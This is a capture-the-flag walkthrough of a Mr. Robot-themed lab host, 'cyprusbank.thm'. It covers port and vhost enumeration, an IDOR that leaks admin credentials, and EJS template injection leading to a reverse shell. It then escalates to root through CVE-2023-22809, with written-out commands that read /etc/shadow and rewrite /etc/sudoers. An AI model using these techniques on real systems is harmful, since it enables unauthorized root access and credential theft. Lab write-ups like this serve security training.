Yet another Mr. Robot themed challenge. — by ngn


Initial Nmap Enumeration
nmap -A -p- 10.10.179.170 -T5 | tee nmap-enum

The scan reveals two significant open ports: port 22, running SSH, and port 80, hosting an nginx 1.14.0 web server.


Visiting the Page
When visiting the index page of web server we are redirected to cyprusbank.thm, so we add this to our /etc/hosts and then refresh the page.

<target-ip> cyprusbank.thm

We are welcomed with a static page with no useful information. Checked the page source code but nothing useful there as well.


Directory Brute Forcing using Gobuster
gobuster dir -u http://10.10.179.170/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -o gobuster-enum

We tried using gobuster to brute force directories which can help us see hidden directories but we didn’t find anything.


VHOST Fuzzing using ffuf
ffuf -u http://cyprusbank.thm/ -H “Host:FUZZ.cyprusbank.thm” -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 1


We performed a VHOST fuzzing scan using FFuf, which discovered two virtual hosts: www and admin. We then added these entries to our /etc/hosts file and proceeded to visit the pages.

<target-ip> cyprusbank.thm admin.cyprusbank.thm

Initial User Login on Admin Page
After accessing the admin page, we were redirected to a login screen.


We were provided with the following credentials in Task 1:

Name: Olivia Cortez

Password: olivi8

Using these credentials, we successfully logged in, but the user account has limited permissions. We are unable to access the data or view the /settings page.


Web Access
Upon accessing the Messages section, we discovered the Admin Chat. Looking closely at the URL, we noticed a parameter c set to ?c=5. To explore further, we tested changing the parameter value, which potentially exposed an IDOR vulnerability.

By modifying the parameter to ?c=9, we found the credentials for the admin user, Gayle Bev.


Using these credentials, we logged in and gained access to the telephone numbers.


Searching for “Tyrell Wellick,” we located his telephone number.


Additionally, we accessed the settings page, where we could change the customer’s password. Notably, the password was reflected on the page, suggesting a possible vulnerability. Based on this behavior, we suspected the presence of either XSS or SSTI.

Exploitation
Using Burp Suite to intercept the request, we modify the password parameter and observe an error message indicating that EJS (Embedded JavaScript) files are being used.


We researched SSTI payloads specifically for EJS and found a relevant information here. We can use this payload to test for SSTI vulnerabilities.


Encountering errors when I type this line of code on Medium.

Next, we prepare a reverse shell by visiting revshells.com to generate the payload. We set our IP address (tun0) and select a port number (default can be used), choosing ‘nc mkfifo’ as the reverse shell type and encoding it using URL encoding.



Then, we start the listener by running “nc -lvnp 5555” in the terminal.


Next, we copied the reverse shell command, pasted it, and then clicked ‘Send’ to execute it.


We then checked the terminal and confirmed that we received a connection back as the user “web.” The next step was to stabilize the shell.


Navigating to /home/web/, we were able to retrieve the flag user.txt


Privilege Escalation to Root
We begin by listing the available sudo privileges for the current user using the sudo -l command. Additionally, we check the version of sudoedit to identify any potential vulnerabilities. Upon inspection, we discover that the sudo version is vulnerable to CVE-2023-22809. This vulnerability allows us to bypass restrictions and gain the ability to read or edit any file by manipulating the EDITOR variable.


After reviewing the CVE, we can exploit this vulnerability by attempting to open /etc/shadow using vi when sudoedit is invoked. The following commands are used to set the EDITOR variable and verify it:

export EDITOR=”vi — /etc/shadow”
echo $EDITOR


We can now read the /etc/shadow file using vi by executing the following command:

sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm


To exit vi, type :qa

Now, let’s use this vulnerability to attempt reading the root flag.

Set the EDITOR environment variable to access the root file:

export EDITOR=”vi — /root/root.txt”
echo $EDITOR

Then, execute the following to trigger sudoedit:

sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm


Finally, this exploit allows us to successfully view the root flag.


To escalate privileges to root, we’ll attempt to edit the /etc/sudoers file.

Set the editor for sudoedit to open the sudoers file:

export EDITOR=”vi — /etc/sudoers”

echo $EDITOR

sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm

Once in vi, press i to enter insert mode and edit the file.

Remove the following line from the /etc/sudoers file:

web ALL=(root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm

Replace the following line:

web ALL=(root) NOPASSWD: ALL


Now, we can run sudo commands without needing to provide the root password. Use sudo su to switch to the root user.

